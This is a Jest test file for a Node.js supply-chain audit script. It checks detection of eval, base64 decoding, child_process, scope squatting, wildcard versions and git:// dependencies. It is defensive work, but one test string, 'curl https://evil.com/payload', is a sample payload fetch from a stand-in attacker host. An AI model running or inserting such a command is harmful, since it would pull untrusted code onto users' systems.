'use strict';

const path = require('path');
const { auditPackageJson, SUSPICIOUS_PATTERNS, MALICIOUS_PATTERNS } = require('../../../07-scripts/supply-chain-audit');

describe('Supply Chain Audit', () => {

  describe('SUSPICIOUS_PATTERNS', () => {
    test('detects eval usage', () => {
      const match = SUSPICIOUS_PATTERNS.some(p => p.test('eval("malicious code")'));
      expect(match).toBe(true);
    });

    test('detects base64 buffer', () => {
      const match = SUSPICIOUS_PATTERNS.some(p => p.test('Buffer.from("abc", "base64")'));
      expect(match).toBe(true);
    });

    test('detects child_process', () => {
      const match = SUSPICIOUS_PATTERNS.some(p => p.test('require("child_process")'));
      expect(match).toBe(true);
    });

    test('detects curl commands', () => {
      const match = SUSPICIOUS_PATTERNS.some(p => p.test('curl https://evil.com/payload'));
      expect(match).toBe(true);
    });

    test('does not flag normal code', () => {
      const match = SUSPICIOUS_PATTERNS.some(p => p.test('console.log("hello world")'));
      expect(match).toBe(false);
    });
  });

  describe('MALICIOUS_PATTERNS', () => {
    test('detects internal scope squatting', () => {
      const match = MALICIOUS_PATTERNS.some(p => p.test('@company-internal/utils'));
      expect(match).toBe(true);
    });

    test('does not flag normal scoped packages', () => {
      const match = MALICIOUS_PATTERNS.some(p => p.test('@types/node'));
      expect(match).toBe(false);
    });
  });

  describe('auditPackageJson', () => {
    test('flags wildcard versions', () => {
      const tmpPath = path.join(__dirname, 'test-pkg-wildcard.json');
      require('fs').writeFileSync(tmpPath, JSON.stringify({
        name: 'test',
        dependencies: { 'some-pkg': '*' }
      }));

      const issues = auditPackageJson(tmpPath);
      const wildcard = issues.find(i => i.issue.includes('wildcard'));
      expect(wildcard).toBeDefined();
      expect(wildcard.severity).toBe('HIGH');

      require('fs').unlinkSync(tmpPath);
    });

    test('flags git:// protocol', () => {
      const tmpPath = path.join(__dirname, 'test-pkg-git.json');
      require('fs').writeFileSync(tmpPath, JSON.stringify({
        name: 'test',
        dependencies: { 'some-pkg': 'git://github.com/user/repo' }
      }));

      const issues = auditPackageJson(tmpPath);
      const gitIssue = issues.find(i => i.issue.includes('git://'));
      expect(gitIssue).toBeDefined();
      expect(gitIssue.severity).toBe('HIGH');

      require('fs').unlinkSync(tmpPath);
    });

    test('passes clean package.json', () => {
      const tmpPath = path.join(__dirname, 'test-pkg-clean.json');
      require('fs').writeFileSync(tmpPath, JSON.stringify({
        name: 'test',
        dependencies: { 'express': '^4.18.0' }
      }));

      // Will flag missing lockfile but no critical issues
      const issues = auditPackageJson(tmpPath);
      const critical = issues.filter(i => i.severity === 'CRITICAL');
      expect(critical).toHaveLength(0);

      require('fs').unlinkSync(tmpPath);
    });
  });
});
